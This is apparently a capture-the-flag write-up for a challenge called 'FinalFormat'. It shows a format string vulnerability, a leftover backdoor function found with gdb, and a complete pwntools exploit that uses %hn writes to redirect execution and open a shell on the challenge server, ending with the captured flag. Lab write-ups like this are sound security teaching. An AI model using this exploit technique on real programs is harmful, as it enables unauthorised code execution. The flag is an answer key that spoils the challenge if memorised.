## FinalFormat

When entering the machine we test the program to check if there's still any format string vulnerability.

```bash
seed@VM:~/ctf/FinalFormat$ ./program 
There is nothing to see here...ola%x%x
You gave me this:ola2578256178
```

There it is!

Although, the devs did their job and removed the backdoor from the program... Or did they? By using gdb we were able to find that it was still here.

```bash
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
...
0x08049236  old_backdoor
...
``` 

We had an idea to redirect the flow of our program to a specific address in memory, but after using the checksec tool, we realized that writing to the stack would be difficult due to security measures in place. We are looking for ways to modify the program, but are unsure of the best approach to take given the constraints:

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

We used the gdb debugger to search for instructions in the code that used calls and jumps to other addresses. We eventually found a jump to the address 0x0804c010. In order to modify the program, we then created an exploit that exploited the format string vulnerability to rewrite the backdoor function to this address:

```py
from pwn import *

LOCAL = False

if LOCAL:
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4007)


N = 60
content = bytearray(0x0 for i in range(N))

content[0:4]  =  (0xaaaabbbb).to_bytes(4, byteorder='little')
content[4:8]  =  (0x0804c012).to_bytes(4, byteorder='little')
content[8:12]  =  ("????").encode('latin-1')
content[12:16]  =  (0x0804c010).to_bytes(4, byteorder='little')

#0x08049236  old_backdoor
s = "%.2036x" + "%hn" + "%.35378x%hn"

fmt  = (s).encode('latin-1')
content[16:16+len(fmt)] = fmt

p.recvuntil(b"You got it:")
p.sendline(content)
p.interactive()
```

We successfully ran the exploit we had created, which allowed us to gain access to a shell. Using this shell, we were able to use the cat command to retrieve the flag.

![flag{071dabf34084204f7e6ad8c47bac006e}](/images/ff_flag.png)
